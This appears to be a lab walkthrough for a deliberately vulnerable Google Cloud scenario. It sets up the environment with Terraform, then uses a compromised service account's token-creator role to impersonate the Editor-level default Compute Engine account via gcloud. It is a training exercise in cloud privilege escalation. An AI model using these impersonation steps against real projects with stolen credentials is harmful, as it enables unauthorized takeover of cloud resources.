## Privilege Escalation Using Service account impersonation


In order to start the scenario go to the `scenario-6` folder by typing the below  command in the shell

``` bash
cd scenario-6
```

Export the project ID by typing the below command in the `GCLOUD Shell`

``` bash
export PROJECT_ID="project-id"
```

> replace the `project-id` with your project ID

Next configure the `gcloud` to use the project by typing the below command in the shell 

``` bash
gcloud config set project $PROJECT_ID
```




Next initialize the terraform by typing the below command in the shell 


``` bash
terraform init
```

Next apply the terraform by typing the below command in the shell 

``` bash
terraform apply -auto-approve -var project-id=$PROJECT_ID
```


Next output the service account key by typing the below command in the shell 

``` bash
terraform output -raw sa-key > creds.json
```


## Scenario Info

According to Google [Documentation](https://cloud.google.com/iam/docs/service-accounts) 

**A service account is a special kind of account used by an application or a virtual machine (VM) instance, not a person.**


One of the coolest feature of the service account is that it can be impersonated by any user/service account in the project if the user/service account has the `iam.serviceAccountTokenCreator` role in the project. In this scenario we are going to exploit this feature 

Whenever we want to impersonate the service account we need to add the `iam.ServiceAccountTokenCreator` role to the user/service account , but keep in the mind if we add this role at the project level then the user/service account can impersonate any service account in the project. 

In this scenario we are going to impersonate the `default-compute-engine` service account which has the `Editor` role in the project


### Solution
This scenario assumes that the attacker has already compromise the `service-account` which as the `iam.serviceAccountTokenCreator`


Configure the `gcloud` to use the `service-account` by typing the below command in the shell 

``` bash
gcloud auth activate-service-account --key-file=creds.json
```

Now try to list the buckets in the project by typing the below command in the shell 

``` bash
gsutil ls
```
> You will get an error saying that you don't have permission to list the buckets

Next we are trying to impersonate the default-compute-engine service account which has `Editor` permission in the project

Export the `default-compute-engine` service account email by typing the below command in the shell 

``` bash
export SA_EMAIL=$(gcloud projects describe $PROJECT_ID --format="value(projectNumber)")-compute@developer.gserviceaccount.com
```

```bash
gcloud config set auth/impersonate_service_account $SA_EMAIL
```

Now try to list the buckets in the project by typing the below command in the shell 

``` bash
gsutil ls
```

This time you will be able to list the buckets in the project

Now as the attacker you can do anything in the project as the `default-compute-engine` service account

Next we are going to unset the impersonated service account by typing the below command in the shell 

``` bash
gcloud config unset auth/impersonate_service_account
```



### Clean up



To clean up the `Scenario` type the below command in the `GCLOUD Shell`

``` bash
terraform destroy -auto-approve -var project-id=$PROJECT_ID
```

